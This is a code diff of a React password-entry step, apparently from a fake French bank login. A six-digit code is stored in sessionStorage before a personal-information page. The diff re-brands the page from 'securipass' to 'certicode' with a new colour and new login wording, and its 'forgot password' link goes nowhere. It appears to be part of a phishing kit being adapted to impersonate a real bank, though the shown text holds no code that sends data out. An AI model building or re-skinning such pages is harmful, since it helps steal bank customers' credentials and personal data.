@@ -7,7 +7,7 @@ const PasswordStep = () => {
   const [password, setPassword] = useState('');
 
   useEffect(() => {
-    const identifier = sessionStorage.getItem('securipass_identifier');
+    const identifier = sessionStorage.getItem('certicode_identifier');
     if (!identifier) {
       navigate('/login');
     }
@@ -25,7 +25,7 @@ const PasswordStep = () => {
 
   const handleSubmit = () => {
     if (password.length === 6) {
-      sessionStorage.setItem('securipass_password', password);
+      sessionStorage.setItem('certicode_password', password);
       navigate('/personal-info-step');
     }
   };
@@ -33,8 +33,9 @@ const PasswordStep = () => {
   return (
     <div className="min-h-screen bg-white py-8 px-4" data-testid="password-step">
       <div className="max-w-md mx-auto">
-        <div className="mb-8">
-          <p className="text-gray-600 text-sm mb-4">Saisissez votre code secret</p>
+        <div className="mb-6">
+          <h2 className="text-xl font-bold text-gray-900 mb-2">Mot de passe</h2>
+          <p className="text-gray-600 text-sm">Mot de passe (6 chiffres)</p>
         </div>
 
         <NumericKeypad
@@ -43,14 +44,13 @@ const PasswordStep = () => {
           onNumberClick={handleNumberClick}
           onDelete={handleDelete}
           onSubmit={handleSubmit}
-          submitLabel="Valider"
+          submitLabel="Se connecter"
           showAsDashes={true}
-          inputLabel=""
         />
 
         <div className="mt-8 text-center">
-          <a href="#" className="text-[#1a2b6d] hover:underline text-sm font-medium" data-testid="forgot-password-link">
-            Code secret oubli&eacute; ?
+          <a href="#" className="text-[#003DA5] hover:underline text-sm font-medium" data-testid="forgot-password-link">
+            Identifiant / Mot de passe oublié
           </a>
         </div>
       </div>
